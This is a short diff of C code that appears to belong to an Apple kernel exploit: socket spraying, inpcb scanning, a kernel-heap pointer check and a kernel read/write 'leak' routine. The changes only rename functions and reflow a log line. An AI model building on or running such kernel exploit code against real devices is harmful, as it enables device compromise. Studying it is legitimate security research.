@@ -38,8 +38,8 @@ void socket_scan_stats_reset(void) {
 
 void socket_scan_stats_log(void) {
     LOG("pe_v3 PCB scans=%llu read_fail=%llu pages=%llu ours=%llu foreign=%llu duplicate=%llu reject_link=%llu reject_pair=%llu reject_filter=%llu forge=%llu", g_scan_stats.scans,
-        g_scan_stats.read_failures, g_scan_stats.pcb_pages, g_scan_stats.owned_pcbs, g_scan_stats.foreign_pcbs, g_scan_stats.duplicate_pcbs, g_scan_stats.rejected_linkage,
-        g_scan_stats.rejected_pair, g_scan_stats.rejected_filter, g_scan_stats.forge_attempts);
+        g_scan_stats.read_failures, g_scan_stats.pcb_pages, g_scan_stats.owned_pcbs, g_scan_stats.foreign_pcbs, g_scan_stats.duplicate_pcbs, g_scan_stats.rejected_linkage, g_scan_stats.rejected_pair,
+        g_scan_stats.rejected_filter, g_scan_stats.forge_attempts);
 }
 
 static bool is_kernel_heap_pointer(uint64_t value) {
@@ -71,7 +71,7 @@ static bool restore_candidate(mach_port_t memory_object, mach_vm_offset_t seekin
     return false;
 }
 
-bool krw_sockets_leak_forever(void) {
+bool cs_krw_sockets_leak_forever(void) {
     /*
      struct inpcb {
          decl_lck_mtx_data(, inpcb_mtx);
@@ -167,7 +167,7 @@ uint64_t spray_socket(void) {
     return output_socket_port;
 }
 
-void sockets_release(void) {
+void cs_sockets_release(void) {
     for (size_t i = 0; i < g_ctx.socket_ports_count; i++) {
         if (g_ctx.socket_ports[i] != MACH_PORT_NULL) mach_port_deallocate(mach_task_self(), g_ctx.socket_ports[i]);
         if ((i + 1) % SOCKET_RELEASE_PACE == 0) usleep(1000);
